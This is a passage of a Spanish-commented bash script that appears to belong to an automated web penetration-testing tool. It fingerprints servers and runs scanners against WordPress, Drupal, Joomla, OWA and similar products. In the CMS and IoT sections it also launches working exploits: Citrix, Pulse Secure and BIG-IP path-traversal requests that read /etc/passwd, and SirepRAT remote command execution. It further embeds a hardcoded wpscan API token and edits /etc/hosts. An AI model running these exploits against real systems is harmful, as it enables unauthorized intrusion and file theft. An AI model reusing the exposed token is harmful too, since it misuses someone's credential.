    $proxychains web-buster.pl -r 0 -t $host -p $port -h 5 -d / -m sap -e 'setValuesAutoCreation' -s $proto -q 1  > logs/enumeracion/"$host"_"$port"_archivosSAP.txt & 	            
}


function enumeracionCMS () { 
   proto=$1
   host=$2
   port=$3     

	if [[ "$MODE" == "total" ]]; then
		echo -e "\t\t[+] Revisando vulnerabilidades HTTP mixtas"
		$proxychains nmap -n -Pn -p $port --script=http-vuln* $host >> logs/vulnerabilidades/"$host"_"$port"_nmapHTTPvuln.txt &
	fi
	
    #######  drupal  ######
    grep -qi drupal .enumeracion/"$host"_"$port"_webData.txt
    greprc=$?
    if [[ $greprc -eq 0 ]];then 

		echo -e "\t\t[+] nuclei Drupal ("$proto"://"$host":"$port")"
		nuclei -u "$proto://$host:$port"  -id /root/.local/nuclei-templates/cves/drupal_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_drupal-nuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_drupal-nuclei.txt &
			
		if [[  "$MODE" == "total" ]]; then
			echo -e "\t\t[+] Revisando vulnerabilidades de drupal ($host)"
        	$proxychains droopescan scan drupal -u  "$proto"://$host --output json > logs/vulnerabilidades/"$host"_"$port"_droopescan.txt 2>/dev/null &
		fi            																																	
    fi

    #######  wordpress  ######
    grep -qi wordpress .enumeracion/"$host"_"$port"_webData.txt
    greprc=$?
    if [[ $greprc -eq 0 ]];then 
		echo -e "\t\t[+] Revisando vulnerabilidades de Wordpress ($host)"		
		echo -e "\t\t[+] nuclei Wordpress ("$proto"://"$host":"$port")"
		nuclei -u "$proto://$host:$port"  -id /root/.local/nuclei-templates/cves/wordpress_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_wordpress-nuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_wordpress-nuclei.txt &

        wpscan  --update  >/dev/null   
        echo -e "\t\t[+] Wordpress user enumeration ("$proto"://"$host":"$port")"
		#echo "$proxychains wpscan --disable-tls-checks  --enumerate u  --random-user-agent --url "$proto"://"$host":"$port" --format json"
        $proxychains wpscan --disable-tls-checks  --enumerate u  --random-user-agent --url "$proto"://"$host":"$port" --format json > logs/vulnerabilidades/"$host"_"$port"_wpUsers.json &
		echo -e "\t\t[+] wordpress_ghost_scanner ("$proto"://"$host":"$port")"
		msfconsole -x "use scanner/http/wordpress_ghost_scanner;set RHOSTS $host; set RPORT $port ;run;exit" > logs/vulnerabilidades/"$host"_"$port"_wordpressGhost.txt 2>/dev/null &

		wordpress-CVE-2022-21661.py $proto"://"$host":"$port/wp-admin/admin-ajax.php 1 > logs/vulnerabilidades/"$host"_"$port"_wordpress-CVE-2022-21661.txt

		wordpress-scan -url $proto"://"$host":"$port/ > logs/vulnerabilidades/"$host"_"$port"_wordpress-plugins.txt &
		xml-rpc-test -url $proto"://"$host":"$port/ > logs/vulnerabilidades/"$host"_"$port"_xml-rpc-habilitado.txt &
		xml-rpc-login -url $proto"://"$host":"$port/ > logs/vulnerabilidades/"$host"_"$port"_xml-rpc-login.txt &
		# https://github.com/roddux/wordpress-dos-poc/tree/master WordPress <= 5.3

		if [[ "$MODE" == "total" ]]; then
			echo -e "\t\t[+] Revisando vulnerabilidades de wordpress "
        	$proxychains wpscan --disable-tls-checks  --random-user-agent --url "$proto"://$host/ --enumerate ap,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U --plugins-detection aggressive  > logs/vulnerabilidades/"$host"_"$port"_wpscan.txt &			
			sleep 5
			grep -qi "The URL supplied redirects to" logs/vulnerabilidades/"$host"_"$port"_wpscan.txt
			greprc=$?
			if [[ $greprc -eq 0 ]];then 		            
				url=`cat logs/vulnerabilidades/"$host"_"$port"_wpscan.txt | perl -lne 'print $& if /http(.*?)\. /' |sed 's/\. //g'`
				echo -e "\t\t[+] url $url ($host: $port)"
				if [[ ${url} == *"$host"*  ]];then 
					echo -e "\t\t[+] Redireccion en wordpress $url ($host: $port)"
					$proxychains wpscan --disable-tls-checks --enumerate u  --random-user-agent --format json --url $url > logs/vulnerabilidades/"$host"_"$port"_wpUsers.json &
					$proxychains wpscan --disable-tls-checks --random-user-agent --url $url --enumerate ap,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U --plugins-detection aggressive > logs/vulnerabilidades/"$host"_"$port"_wpscan.txt &
				else
					echo -e "\t\t[+] Ya lo escaneamos por dominio" 
				fi  
			fi
			grep "Title" logs/vulnerabilidades/"$host"_"$port"_wpscan.txt | cut -d ":" -f2 > .vulnerabilidades/"$host"_"$port"_pluginDesactualizado.txt
			strings logs/vulnerabilidades/"$host"_"$port"_wpscan.txt | grep --color=never "Title" -m1 -b3 -A19 >> logs/vulnerabilidades/"$host"_"$port"_pluginDesactualizado.txt
			if [[ ! -s .vulnerabilidades/"$host"_"$port"_pluginDesactualizado.txt  ]] ; then
				strings logs/vulnerabilidades/"$host"_"$port"_wpscan.txt | grep --color=never "out of date" -m1 -b3 -A19 >> logs/vulnerabilidades/"$host"_"$port"_pluginDesactualizado.txt
				cp logs/vulnerabilidades/"$host"_"$port"_pluginDesactualizado.txt .vulnerabilidades/"$host"_"$port"_pluginDesactualizado.txt
			fi
			
			strings logs/vulnerabilidades/"$host"_"$port"_wpscan.txt | grep --color=never "XML-RPC seems" -m1 -b1 -A9 > logs/vulnerabilidades/"$host"_"$port"_configuracionInseguraWordpress.txt 2>/dev/null
		fi
        	       
    fi
	# curl -k https://$DOMINIO/wp-json/wp/v2/users
	# curl -k https://$DOMINIO/wp-json/akismet/v1
	# curl -k https://$DOMINIO/wp-json
	# curl -k https://$DOMINIO/wp-json/wp/v2/pages
                                
    ###################################	 

    #######  citrix  ######
    grep -qi citrix .enumeracion/"$host"_"$port"_webData.txt
    greprc=$?
    if [[ $greprc -eq 0 ]];then 								
        echo -e "\t\t[+] Revisando vulnerabilidades de citrix ($host)"        
        $proxychains CVE-2019-19781.sh $host $port "cat /etc/passwd" > logs/vulnerabilidades/"$host"_"$port"_citrixVul.txt &         
    fi
    ###################################	

	#######  hadoop  ######
    grep -qi 'Hadoop Administration' .enumeracion/"$host"_"$port"_webData.txt
    greprc=$?
    if [[ $greprc -eq 0 ]];then 								
        echo -e "\t\t[+] Revisando vulnerabilidades de Hadoop ($host)"        
        echo "$proxychains  nmap -n -Pn --script hadoop-namenode-info -p $port $host" > logs/enumeracion/"$host"_"$port"_hadoopNamenode.txt
		$proxychains nmap -n -Pn --script hadoop-namenode-info -p $port $host >> logs/enumeracion/"$host"_"$port"_hadoopNamenode.txt &		
		#http://182.176.151.83:50070/dfshealth.html
		#http://182.176.151.83:50070/conf
		#docker run  -v "$PWD":/tmp -it exploit-legacy hdfsbrowser 182.176.151.83 
    fi
    ###################################	

	#######  Hadoop YARN ResourceManager  ######
    grep -qi 'YARN' .enumeracion/"$host"_"$port"_webData.txt
    greprc=$?
    if [[ $greprc -eq 0 ]];then 								
        echo -e "\t\t[+] Revisando vulnerabilidades de Hadoop YARN ResourceManager ($host)"        
        nuclei -u $host -t /root/.local/nuclei-templates/misconfiguration/hadoop-unauth-rce.yaml  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_hadoop-rce.txt
    fi
    ###################################	


    #######  Pulse secure  ######
    grep -qi pulse .enumeracion/"$host"_"$port"_webData.txt
    greprc=$?
    if [[ $greprc -eq 0 ]];then 								
        echo -e "\t\t[+] Revisando vulnerabilidades de Pulse Secure ($host)"        
        $proxychains curl --max-time 10 --path-as-is -s -k "$proto://$host/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" > logs/vulnerabilidades/"$host"_"$port"_pulseVul.txt &
                
    fi
    ##################################		


    #######  OWA  ######
    egrep -qi "Outlook|owa" .enumeracion/"$host"_"$port"_webData.txt
    greprc=$?
    if [[ $greprc -eq 0 ]];then 		
        echo -e "\t\t[+] Revisando vulnerabilidades de OWA($host)"
        
		#CVE-2020-0688 
        $proxychains owa.pl -host $host -port $port  > logs/vulnerabilidades/"$host"_"$port"_CVE-2020-0688.txt &
        #https://github.com/MrTiz/CVE-2020-0688 authenticated

		#CVE-2021-34473 
		nuclei -u https://$host:$port/owa/ -t /usr/share/lanscanner/nuclei/proxyshell.yaml -debug 2> logs/vulnerabilidades/"$host"_"$port"_proxyshell.txt
		
		#CVE-2022-41040
		nuclei -u https://$host:$port/owa/ -t /usr/share/lanscanner/nuclei/proxynoshell.yaml -debug 2> logs/vulnerabilidades/"$host"_"$port"_proxynoshell.txt
		        
    fi
    ###################################		



    #######  joomla  ######
    grep -qi joomla .enumeracion/"$host"_"$port"_webData.txt
    greprc=$?
    if [[ $greprc -eq 0 ]];then 										
        echo -e "\t\t[+] Revisando vulnerabilidades de joomla ($host)"
        #joomscan.sh -u "$proto"://$host/ | sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" > logs/vulnerabilidades/"$host"_"$port"_joomscan.txt &	
		joomla_version.pl -host $host -port $port -path / > logs/enumeracion/"$host"_"$port"_joomla-version.txt &
        
		#joomla-cd.rb "$proto://$host" > logs/vulnerabilidades/"$host"_"$port"_joomla-CVE-2023-23752.txt &
		echo -e "\t\t[+] Nuclei Joomla ($host)"
		nuclei -u "$proto://$host:$port"  -id /root/.local/nuclei-templates/cves/joomla_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_joomla-nuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_joomla-nuclei.txt &

		echo -e "\t\t[+] Revisando si el registro esta habilitado"
		status_code=`curl --max-time 10 -s -k -o /dev/null -w "%{http_code}"  "$proto://$host:$port/index.php/component/users/?view=registration"`
		if [ "$status_code" == '200' ]; then 
			echo "$proto://$host:$port/index.php/component/users/?view=registration" > .vulnerabilidades/"$host"_"$port"_cms-registroHabilitado.txt
		fi
    fi
    ###################################	

    #######  WAMPSERVER  ######
    grep -qi WAMPSERVER .enumeracion/"$host"_"$port"_webData.txt
    greprc=$?
    if [[ $greprc -eq 0 ]];then 										
        echo -e "\t\t[+] Enumerando WAMPSERVER ($host)"
        $proxychains wampServer.pl -url "$proto"://$host/ > .enumeracion/"$host"_"$port"_WAMPSERVER.txt &
    fi
    ###################################	


    #######  BIG-IP F5  ######
    grep -qi "BIG-IP" .enumeracion/"$host"_"$port"_webData.txt
    greprc=$?
    if [[ $greprc -eq 0 ]];then 		
        echo -e "\t\t[+] Revisando vulnerabilidades de BIG-IP F5  ($host)"        
        $proxychains curl --max-time 10 --path-as-is -s -k "$proto://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" > logs/vulnerabilidades/"$host"_"$port"_bigIPVul.txt &                
    fi
    ###################################
   	
}


function testSSL ()
{
   proto=$1
   host=$2
   port=$3 

    echo -e "\t\t[+] TEST SSL ($proto : $host : $port)"	
	waitWeb 2.5
    #######  hearbleed ######						
    echo -e "\t\t[+] Revisando vulnerabilidad heartbleed"
    echo "$proxychains  nmap -n -sT -Pn -p $port --script=ssl-heartbleed $host" > logs/vulnerabilidades/"$host"_"$port"_heartbleed.txt 2>/dev/null 
    $proxychains nmap -n -sT -Pn -p $port --script=ssl-heartbleed $host >> logs/vulnerabilidades/"$host"_"$port"_heartbleed.txt 2>/dev/null &

    ##########################
    
    
    #######  Configuracion TLS/SSL (dominio) ######	
	if [[ "$MODE" == "total" ]]; then 
		echo -e "\t\t[+] Revisando configuracion TLS/SSL"		
		testssl.sh --color 0  "https://$host:$port" > logs/vulnerabilidades/"$host"_"$port"_testSSL.txt 2>/dev/null &
	fi					
    
    ##########################    

}

function enumeracionIOT ()
{
   proto=$1
   host=$2
   port=$3  
   
#   if [ "$VERBOSE" == 's' ]; then  echo -e "\t\t[+]Params $proto : $host : $port "; fi
	egrep -iq "Windows Device Portal" .enumeracion/"$host"_"$port"_webData.txt 
	greprc=$?
	if [[ $greprc -eq 0 && ! -f .enumeracion/"$host"_"$port"_webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes				
		echo -e "\t\t[+] Revisando SirepRAT ($host)"
		$proxychains SirepRAT.sh $host LaunchCommandWithOutput --return_output --cmd 'c:\windows\System32\cmd.exe' --args '/c ipconfig' --v >> logs/vulnerabilidades/"$host"_"$port"_SirepRAT.txt
		grep -ia 'IPv4' logs/vulnerabilidades/"$host"_"$port"_SirepRAT.txt > .vulnerabilidades/"$host"_"$port"_SirepRAT.txt

	fi

					
	#######  DLINK backdoor ######
	
	respuesta=`grep -i alphanetworks .enumeracion/"$host"_"$port"_webData.txt`
	greprc=$?
	if [[ $greprc -eq 0 ]];then 		
		echo -e "\t\t$OKRED[!] DLINK Vulnerable detectado \n $RESET"						
		echo -n "[DLINK] $respuesta" >> .vulnerabilidades/"$host"_"$port"_backdoorFabrica.txt 
		
	fi
	###########################		
}        


function cloneSite ()
{
   proto=$1
   host=$2
   port=$3  
   echo -e "\t\t[+] Clone site ($proto : $host : $port)"	

    #######  clone site  ####### 			
    cd webClone/$host/
        echo -e "\t\t[+] Clonando sitio ($host) del DOMINIO $DOMINIO tardara un rato"	
		pwd
        wget -mirror --convert-links --adjust-extension --no-parent -U "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --reject gif,jpg,bmp,png,mp4,jpeg,flv,webm,mkv,ogg,gifv,avi,wmv,3gp,ttf,svg,woff2,css,ico --exclude-directories /calendar,/noticias,/blog,/xnoticias,/article,/component,/index.php --timeout=5 --tries=1 --adjust-extension  --level=3 --no-check-certificate $proto://$host 2>/dev/null
        rm index.html.orig 2>/dev/null

        echo ""
        echo -e "\t\t[+] Extrayendo URL de los sitios clonados"	
        grep --color=never -irao "http://[^ ]*"  * 2>/dev/null| cut -d ":" -f3 | grep --color=never -ia "$host" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" |cut -d '"' -f1 | sort | uniq > http.txt
        lines=`wc -l http.txt  | cut -d " " -f1`
        perl -E "say \"http://\n\" x $lines" > prefijo.txt # file with the DOMINIO (n times)
        paste -d '' prefijo.txt http.txt >> ../../logs/enumeracion/"$host"_web_wget2.txt 2>/dev/null # adicionar http:// a cada linea
        rm http.txt 2>/dev/null

        grep --color=never -irao "https://[^ ]*"  * 2>/dev/null | cut -d ":" -f3 | grep --color=never -ia "$host" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" |cut -d '"' -f1 | sort | uniq > https.txt 
        lines=`wc -l https.txt  | cut -d " " -f1`
        perl -E "say \"https://\n\" x $lines" > prefijo.txt # file with the DOMINIO (n times)
        paste -d '' prefijo.txt https.txt >> ../../logs/enumeracion/"$host"_web_wget2.txt 2>/dev/null  # adicionar https:// a cada linea
        rm https.txt 2>/dev/null

                    
        echo -e "\t\t[+] Buscando archivos sin extension"
        find . -type f ! \( -iname \*.pdf -o -iname \*.html -o -iname \*.htm -o -iname \*.doc -o -iname \*.docx -o -iname \*.xls -o -iname \*.ppt -o -iname \*.pptx -o -iname \*.xlsx -o -iname \*.js -o -iname \*.PNG  -o -iname \*.txt  -o -iname \*.css  -o -iname \*.php -o -iname \*.orig \) > archivos-sin-extension.txt
        contador=1
        mkdir documentos_renombrados 2>/dev/null
        for archivo in `cat archivos-sin-extension.txt`;
        do 		
            tipo_archivo=`file $archivo`
            # tipos de archivos : https://docs.microsoft.com/en-us/previous-versions//cc179224(v=technet.10)
            if [[ ${tipo_archivo} == *"PDF"*  ]];then 
                mv $archivo documentos_renombrados/$contador.pdf 
            fi		
        
            if [[ ${tipo_archivo} == *"Creating Application: Microsoft Word"*  ]];then 												
                mv $archivo documentos_renombrados/$contador.doc 
            fi		
            
            if [[ ${tipo_archivo} == *"Microsoft Word 2007"*  ]];then 												
                mv $archivo documentos_renombrados/$contador.docx 
            fi		
        
            if [[ ${tipo_archivo} == *"Creating Application: Microsoft Excel"*  ]];then 				
                mv $archivo documentos_renombrados/$contador.xls 
            fi				 
        
            if [[ ${tipo_archivo} == *"Office Excel 2007"*  ]];then 							
                mv $archivo documentos_renombrados/$contador.xlsx 
            fi
                
            if [[ ${tipo_archivo} == *"Creating Application: Microsoft PowerPoint"*  ]];then 								
                mv $archivo documentos_renombrados/$contador.ppt 
            fi	
                
            if [[ ${tipo_archivo} == *"Office PowerPoint 2007"*  ]];then 				
                mv $archivo documentos_renombrados/$contador.pptx 
            fi		
        
            if [[ ${tipo_archivo} == *"RAR archive data"*  ]];then 						
                mv $archivo documentos_renombrados/$contador.rar 
            fi		
            let "contador=contador+1"	 
        done # fin revisar archivos sin extension
        
        #### mover archivos con metadata para extraerlos ########
        echo -e "\t\t[+] Extraer metadatos con exiftool"										
        find . -name "*.pdf" -exec mv {} "../../archivos/$host/" \;
        find . -name "*.xls" -exec mv {} "../../archivos/$host/" \;
        find . -name "*.doc" -exec mv {} "../../archivos/$host/" \;
        find . -name "*.ppt" -exec mv {} "../../archivos/$host/" \;
        find . -name "*.pps" -exec mv {} "../../archivos/$host/" \;
        find . -name "*.docx" -exec mv {} "../../archivos/$host/" \;
        find . -name "*.pptx" -exec mv {} "../../archivos/$host/" \;
        find . -name "*.xlsx" -exec mv {} "../../archivos/$host/" \;
        
		if [ "$INTERNET" == "s" ]; then 	#escluir CDN 
			######### buscar IPs privadas
			echo -e "\t\t[+] Revisando si hay divulgación de IPs privadas"	
			grep -ira "192\.168\." * | grep -v "checksumsEscaneados" | sort | uniq >> ../../.vulnerabilidades/"$host"_web_IPinterna.txt
			grep -ira "172\.16\." * | grep -v "checksumsEscaneados" | sort | uniq >> ../../.vulnerabilidades/"$host"_web_IPinterna.txt
									
			grep -ira "http://172\." * | grep -v "checksumsEscaneados" | sort | uniq >> ../../.vulnerabilidades/"$host"_web_IPinterna.txt
			grep -ira "http://10\." * | grep -v "checksumsEscaneados" | sort | uniq >> ../../.vulnerabilidades/"$host"_web_IPinterna.txt
			grep -ira "http://192\." * | grep -v "checksumsEscaneados" | sort | uniq >> ../../.vulnerabilidades/"$host"_web_IPinterna.txt

			grep -ira "https://172\." * | grep -v "checksumsEscaneados" | sort | uniq >> ../../.vulnerabilidades/"$host"_web_IPinterna.txt
			grep -ira "https://10\." * | grep -v "checksumsEscaneados" | sort | uniq >> ../../.vulnerabilidades/"$host"_web_IPinterna.txt
			grep -ira "https://192\." * | grep -v "checksumsEscaneados" | sort | uniq >> ../../.vulnerabilidades/"$host"_web_IPinterna.txt
			###############################	
		fi
        
        ######### buscar links de amazon EC2
        grep --color=never -ir 'amazonaws.com' * >> ../../.enumeracion/"$host"_web_amazon.txt
        
        ######### buscar comentarios 
        echo -e "\t\t[+] Revisando si hay comentarios html, JS"	
        grep --color=never -ir '// ' * | egrep -v "http|https|header|footer|div|class|a padding to disable MSIE " >> ../../.enumeracion/"$host"_web_comentario.txt
        grep --color=never -r '<!-- ' * | egrep -v "header|footer|div|class|a padding to disable MSIE " >> ../../.enumeracion/"$host"_web_comentario.txt
        grep --color=never -r ' \-\->' * | egrep -v "header|footer|div|class|a padding to disable MSIE " >> ../../.enumeracion/"$host"_web_comentario.txt        
        ###############################	
    cd ../../
}

	
############## Extraer informacion web y SSL
# web.txt
# 192.168.0.1:80:http
# www.ejemplo.com:443:https
for line in $(cat $TARGETS); do    	
	ip=`echo $line | cut -f1 -d":"`
	port=`echo $line | cut -f2 -d":"`	
	proto_http=`echo $line | cut -f3 -d":"` #http/https
	waitWeb 0.5
	echo -e "[+]Escaneando $ip $port ($proto_http)"
	echo -e "\t[i] Identificacion de técnologia usada en los servidores web"	
	$proxychains webData.pl -t $ip -p $port -s $proto_http -e todo -d / -l logs/enumeracion/"$ip"_"$port"_webData.txt -r 4 | grep -vi 'read timeout' > .enumeracion/"$ip"_"$port"_webData.txt 2>/dev/null &			             	
	if [[ "$proto_http" == "https" && "$HOSTING" == "n" ]] ;then
		echo -e "\t[+]Obteniendo dominios del certificado SSL"
		$proxychains get_ssl_cert $ip $port  > logs/enumeracion/"$ip"_"$port"_cert.txt  2>/dev/null &
	fi  ##### extract domains certificate		
done

waitFinish



################ buscar dominios y host virtuales
for line in $(cat $TARGETS); do  	
	ip=`echo $line | cut -f1 -d":"`
	port=`echo $line | cut -f2 -d":"`	
	proto_http=`echo $line | cut -f3 -d":"` #http/https

	extractLinks.py logs/enumeracion/"$ip"_"$port"_webData.txt > .enumeracion/"$ip"_"$port"_webLinks.txt
	
	egrep -iq "apache|nginx|kong|IIS" .enumeracion/"$ip"_"$port"_webData.txt
	greprc=$?						
	if [[ "$HOSTING" == 'n' ]] && [[ $greprc -eq 0 ]]; then
		echo -e "\t[+]  Buscando hosts virtuales en $ip:$port"
		waitWeb 2.5
		nmap -Pn -sV -n -p $port $ip 2>/dev/null | grep 'Host:' | grep '\.' | awk '{print $4}' | sort | uniq > logs/enumeracion/"$ip"_"$port"_domainNmap.txt &
		grep 'Dominio identificado' .enumeracion/"$ip"_"$port"_webData.txt | cut -d "^" -f4 | uniq > logs/enumeracion/"$ip"_web_domainWebData.txt
	fi																											
								
	if [[ "$IP_LIST_FILE" == *"importarMaltego"* ]] && [[ ! -z "$DOMINIO" ]]; then	#Si escaneamos un dominio especifico fuzzer vhosts
		echo -e "\t[+]  Fuzzing DOMINIO: $DOMINIO en busca de vhost"
		wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomain.txt -H "Host: FUZZ.$DOMINIO" -u $proto_http://$DOMINIO -t 100 -f logs/enumeracion/baseline_"$proto_http"_vhosts.txt	2>/dev/null
		chars=`cat logs/enumeracion/baseline_"$proto_http"_vhosts.txt | grep 'C=' | awk '{print $7}'`
		echo "chars $chars"

		wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.$DOMINIO" -u $proto_http://$DOMINIO -t 100 --hh $chars --hc 401 -f logs/enumeracion/"$ip"_"$port"_vhosts.txt	2>/dev/null
		grep 'Ch' logs/enumeracion/"$ip"_"$port"_vhosts.txt | grep -v 'Word' | awk '{print $9}' | tr -d '"' > .enumeracion/"$ip"_"$port"_vhosts.txt
		vhosts=`cat .enumeracion/"$ip"_"$port"_vhosts.txt`
		vhosts=$(echo $vhosts | sed 's/_/-/g')

		for vhost in $vhosts; do					
			echo -e "\t\t[+] Adicionando vhost $vhost a los targets"	
			echo "$ip $vhost.$DOMINIO" >> /etc/hosts
			echo "$ip,$vhost.$DOMINIO,vhost" >> $IP_LIST_FILE
		done
	fi	#importarMaltego					
done #ip
######################

waitFinish


############ Obteniendo información web DOMINIO
for line in $(cat $TARGETS); do  	
	ip=`echo $line | cut -f1 -d":"`
	port=`echo $line | cut -f2 -d":"`	
	proto_http=`echo $line | cut -f3 -d":"` #http/https

	if formato_ip $ip; then		
		if [ "$VERBOSE" == 's' ]; then  echo "[+] $ip es una dirección IP"; fi

		echo -e "\n$OKGREEN[+] ############## IDENTIFICAR DOMINIOS ASOCIADOS AL IP $ip:$port $RESET########"
		#Certificado SSL + nmap + webdata
		grep -v 'failed' logs/enumeracion/"$ip"_"$port"_cert.txt > .enumeracion/"$ip"_"$port"_cert.txt 2>/dev/null
		DOMINIOS_SSL=`cat .enumeracion/"$ip"_"$port"_cert.txt 2>/dev/null| tr "'" '"'| jq -r '.subdomains[]' 2>/dev/null | uniq` #Lista un dominio por linea
		DOMINIO_INTERNO_NMAP=`cat logs/enumeracion/"$ip"_"$port"_domainNmap.txt 2>/dev/null`
		DOMINIO_INTERNO_WEBDATA=`cat logs/enumeracion/"$ip"_web_domainWebData.txt 2>/dev/null`

		if [[  $DOMINIOS_SSL =~ ^[0-9]+$ || $DOMINIOS_SSL == *"_"* ]] ; then #si contiene solo numeros o el caracter _
			DOMINIOS_INTERNOS_TODOS="$DOMINIO_INTERNO_NMAP"$'\n'"$DOMINIO_INTERNO_WEBDATA"
		else
			DOMINIOS_INTERNOS_TODOS="$DOMINIOS_SSL"$'\n'"$DOMINIO_INTERNO_NMAP"$'\n'"$DOMINIO_INTERNO_WEBDATA"
		fi
		
		if [ "$VERBOSE" == 's' ]; then  echo "DOMINIOS_SSL $DOMINIOS_SSL"; fi
		if [ "$VERBOSE" == 's' ]; then  echo "DOMINIO_INTERNO_NMAP $DOMINIO_INTERNO_NMAP"; fi
		if [ "$VERBOSE" == 's' ]; then  echo "DOMINIO_INTERNO_WEBDATA $DOMINIO_INTERNO_WEBDATA"; fi
		if [ "$VERBOSE" == 's' ]; then  echo "DOMINIOS_INTERNOS_TODOS $DOMINIOS_INTERNOS_TODOS"; fi
		for DOMINIO_INTERNO in $DOMINIOS_INTERNOS_TODOS; do	
			if [[ ${DOMINIO_INTERNO} == *"enterpriseregistration.windows.net"*  ]];then 
				echo "$DOMINIO_INTERNO" >> .enumeracion/"$ip"_"$port"_azureAD.txt 
			else	
				echo -e "[+] DOMINIO_INTERNO $DOMINIO_INTERNO"
				
				grep -q "$DOMINIO_INTERNO" servicios/webApp.txt 2>/dev/null # Verficar si ya identificamos esa app
				greprc=$? # greprc=1 dominio no en lista, greprc=2 servicios/webApp.txt no existe
				
				if [ "$DOMINIO_INTERNO" != NULL ] && [ "$DOMINIO_INTERNO" != "localhost" ] && [ "$DOMINIO_INTERNO" != "" ] && [ "$DOMINIO_INTERNO" != *"*"* ] && ([ "$greprc" -eq 1 ] || [ "$greprc" -eq 2 ]); then
						
					#Agregar a la lista de targets
					grep -q "$ip,$DOMINIO_INTERNO" $IP_LIST_FILE
					greprc=$?
					if [[ $greprc -eq 1  &&  ${DOMINIO_INTERNO} != *"localhost"* &&  ${DOMINIO_INTERNO} != *"127.0.0.1"*  ]];then # si ya agregamos ese dominio																
						echo "$ip,$DOMINIO_INTERNO,DOMINIO" >> $IP_LIST_FILE						
					else
						echo "Ya agregue mas antes $DOMINIO_INTERNO a  $IP_LIST_FILE"
					fi

					#Agregar a /etc/hosts					
					grep -q $DOMINIO_INTERNO /etc/hosts
					greprc=$?
					if [[ $greprc -eq 1  &&  ${DOMINIO_INTERNO} != *"localhost"* &&  ${DOMINIO_INTERNO} != *"127.0.0.1"*  ]];then # si ya agregamos ese dominio																
						echo "Adicionando $DOMINIO_INTERNO a /etc/hosts"
						echo "$ip $DOMINIO_INTERNO" >> /etc/hosts							
					else
						echo "Ya agregue mas antes $DOMINIO_INTERNO a /etc/hosts "					
					fi
				fi
			fi		
		done
	fi # Fin IP format
	
	########## Obteniendo información web DOMINIO ###########			
	while true; do
		free_ram=`free -m | grep -i mem | awk '{print $7}'`		
		script_instancias=$((`ps aux | grep webData | wc -l` - 1)) 
		python_instancias=$((`ps aux | grep get_ssl_cert | wc -l` - 1)) 
		script_instancias=$((script_instancias + python_instancias))
		
		if [[ $free_ram -gt $MIN_RAM && $script_instancias -lt 4  ]];then 								
			if [ "$VERBOSE" == 's' ]; then  echo "SUBNET $SUBNET IP_LIST_FILE=$IP_LIST_FILE"; fi
				lista_hosts=`grep --color=never $ip $IP_LIST_FILE  | egrep 'DOMINIO|subdomain|vhost'| cut -d "," -f2`		
							
			if [ "$VERBOSE" == 's' ]; then  echo "lista_hosts1 $lista_hosts"; fi #lista de todos los dominios
			for host in $lista_hosts; do
				if [[  ${host} != *"localhost"*  &&  ${host} != *"cpcalendars."* && ${host} != *"cpcontacts."*  && ${host} != *"webdisk."* ]];then    
					echo -e "\t[+] Obteniendo informacion web (host: $host port:$port)"
					# Una sola rediccion (-r 1) para evitar que escaneemos 2 veces el mismo sitio
					$proxychains webData.pl -t $host -p $port -s $proto_http -e todo -d / -l logs/enumeracion/"$host"_"$port"_webData.txt -r 1 | grep -vi 'read timeout|Connection refused|Connection timed out' > .enumeracion/"$host"_"$port"_webData.txt 2>/dev/null &
				fi
			done
		
			################################	
			
			break
		else								
			script_instancias=`ps aux | grep perl | egrep -v 'discover.sh|lanscanner.sh|autohack.sh|heka.sh|grep -E'| wc -l`
			echo -e "\t[-] Maximo número de instancias de perl ($script_instancias) RAM = $free_ram Mb "
			sleep 3										
		fi		
	done # while true
done # for web.txt

waitFinish


echo -e "$OKGREEN\n[i] Realizando la navegacion forzada $RESET"
for line in $(cat $TARGETS); do
	ip=`echo $line | cut -f1 -d":"`
	port=`echo $line | cut -f2 -d":"`
	proto_http=`echo $line | cut -f3 -d":"`
	echo -e "\n[+] Escaneando $ip:$port ($proto_http)"

												
	if [ "$VERBOSE" == 's' ]; then  echo "IP_LIST_FILE=$IP_LIST_FILE "; fi 
	lista_hosts=`grep --color=never $ip $IP_LIST_FILE  | egrep 'DOMINIO|subdomain|vhost'| cut -d "," -f2`					

			
	if [ -z "$lista_hosts" ] ; then 
			lista_hosts=$ip
	else
			lista_hosts=`echo -e "$lista_hosts\n$ip"|uniq`
	fi

	
	if [ "$VERBOSE" == 's' ]; then  echo -e "LISTA HOST: \n $lista_hosts"; fi #lista de todos los dominios + ip			
	for host in $lista_hosts; do
		#Verificar que no siempre devuelve 200 OK
		status_code_nonexist=`getStatus -url $proto_http://$host:$port/nonexisten45s/`
		
		if [ "$status_code_nonexist" == '200' ]; then 
			echo -n "~Always200-OK" >> .enumeracion/"$host"_"$port"_webData.txt
			sed -i ':a;N;$!ba;s/\n//g' .enumeracion/"$host"_"$port"_webData.txt #borrar salto de linea
		fi
		

		if [ "$VERBOSE" == 's' ]; then  echo -e "\t[+] $proto_http://$host:$port/nonexisten45s/ status_code $status_code_nonexist "; fi
		
		if [[  ${host} != *"localhost"*  && ${host} != *"cpanel."*  && ${host} != *"cpcalendars."* && ${host} != *"cpcontacts."*  && ${host} != *"ftp."* && ${host} != *"webdisk."* && ${host} != *"webmail."* &&  ${host} != *"whm."* && "$status_code_nonexist" == *"40"*  ]];then 

